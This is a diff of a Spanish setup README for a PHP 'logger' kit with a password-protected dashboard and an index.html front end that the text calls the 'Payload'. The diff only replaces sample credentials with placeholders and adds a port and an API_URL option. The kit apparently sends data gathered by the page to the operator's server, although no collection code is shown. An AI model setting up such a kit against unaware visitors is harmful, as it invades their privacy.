@@ -26,11 +26,13 @@ Accede a tu gestor de base de datos (phpMyAdmin) y ejecuta el siguiente comando 
 Abre el archivo logger.php y edita la sección de configuración con las credenciales de tu base de datos:
 
 <pre> 
- // logger.php
-$servername = "localhost";      // Tu servidor (usualmente localhost)
-$username = "tu_usuario_sql";   // Tu usuario de BD
-$password = "tu_password_sql";  // Tu contraseña de BD
-$dbname = "nombre_de_tu_db";    // El nombre de tu base de datos
+// logger.php
+  
+$servername = "CREDENCIAL"; // TU SERVIDOR DE LA BD AQUÍ
+$username = "CREDENCIAL"; // TU USUARIO DE LA BD AQUÍ
+$password = "CREDENCIAL"; // Asegúrate de que esta sea la correcta
+$dbname = "CREDENCIAL"; // NOMBRE DE LA BD AQUÍ
+$port = CREDENCIAL; // PUERTO DE LA BD AQUÍ
 </pre>
 
 # Paso 3: Configurar el Dashboard
@@ -38,8 +40,16 @@ Abre el archivo dashboard.php y configura tanto el acceso a la BD como la contra
 
 <pre> 
 // dashboard.php
-$access_password = "admin123";  // <--- CAMBIA ESTO POR UNA CONTRASEÑA SEGURA
-$db_password = "tu_password_sql"; // La misma contraseña de la BD del paso anterior
+  
+$access_password = "CREDENCIAL"; // CAMBIA ESTO POR TU CONTRASEÑA DE ACCESO AL PANEL
+
+// Credenciales de la Base de Datos (Las mismas de logger.php)
+  
+$servername = "CREDENCIAL"; // TU SERVIDOR DE LA BD AQUÍ
+$username = "CREDENCIAL"; // TU USUARIO DE LA BD AQUÍ
+$db_password = "CREDENCIAL"; // TU CONTRASEÑA DE LA BD AQUÍ
+$dbname = "CREDENCIAL"; // NOMBRE DE LA BD AQUÍ
+$port = CREDENCIAL; // PUERTO DE LA BD AQUÍ
 </pre>
 
 # Paso 4: Configurar el Payload (Frontend)
@@ -50,6 +60,7 @@ Abre el archivo index.html. Busca la constante API_URL y coloca la dirección we
 // index.html
 // Ejemplo: https://mi-servidor.com/logger.php
 const API_URL = 'https://TU_DOMINIO/logger.php';
+// O simplemente dejalo: const API_URL = 'logger.php'; //depende de tu servidor.
 </pre>
 
 ## ⚠️ Solución de Problemas (Troubleshooting)
